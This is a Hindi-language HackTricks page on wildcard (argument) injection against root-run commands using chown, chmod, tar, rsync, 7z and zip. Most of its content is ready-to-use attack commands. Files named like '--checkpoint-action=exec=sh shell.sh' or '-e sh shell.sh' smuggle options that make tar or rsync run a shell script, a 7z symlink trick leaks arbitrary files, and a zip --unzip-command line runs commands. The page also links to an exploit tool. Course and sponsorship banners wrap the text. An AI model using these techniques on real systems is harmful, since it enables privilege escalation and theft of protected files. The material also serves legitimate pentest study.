{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## chown, chmod

आप **यह संकेत दे सकते हैं कि आप बाकी फाइलों के लिए कौन सा फ़ाइल मालिक और अनुमतियाँ कॉपी करना चाहते हैं**
```bash
touch "--reference=/my/own/path/filename"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(संयुक्त हमला)_ का उपयोग करके शोषण कर सकते हैं।\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं।

## Tar

**मनमाने आदेश निष्पादित करें:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar हमला)_ का उपयोग करके शोषण कर सकते हैं।\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं।

## Rsync

**मनमाने आदेश निष्पादित करें:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ का उपयोग करके शोषण कर सकते हैं।\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं।

## 7z

**7z** में `--` का उपयोग करने पर भी `*` से पहले (ध्यान दें कि `--` का अर्थ है कि इसके बाद का इनपुट पैरामीटर के रूप में नहीं लिया जा सकता, इसलिए इस मामले में केवल फ़ाइल पथ) आप एक मनमाना त्रुटि उत्पन्न कर सकते हैं जिससे एक फ़ाइल पढ़ी जा सके, इसलिए यदि निम्नलिखित में से कोई आदेश रूट द्वारा निष्पादित किया जा रहा है:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
और आप उस फ़ोल्डर में फ़ाइलें बना सकते हैं जहाँ यह निष्पादित किया जा रहा है, आप फ़ाइल `@root.txt` बना सकते हैं और फ़ाइल `root.txt` को उस फ़ाइल के लिए **symlink** बना सकते हैं जिसे आप पढ़ना चाहते हैं:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
फिर, जब **7z** निष्पादित होता है, यह `root.txt` को उन फ़ाइलों की सूची के रूप में मानता है जिन्हें इसे संकुचित करना चाहिए (यही `@root.txt` के अस्तित्व का संकेत है) और जब 7z `root.txt` पढ़ता है, तो यह `/file/you/want/to/read` को पढ़ेगा और **चूंकि इस फ़ाइल की सामग्री फ़ाइलों की सूची नहीं है, यह एक त्रुटि फेंकेगा** जो सामग्री दिखा रहा है।

_हैकदबॉक्स से CTF के बॉक्स के लेखों में अधिक जानकारी।_

## ज़िप

**मनमाने आदेश निष्पादित करें:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
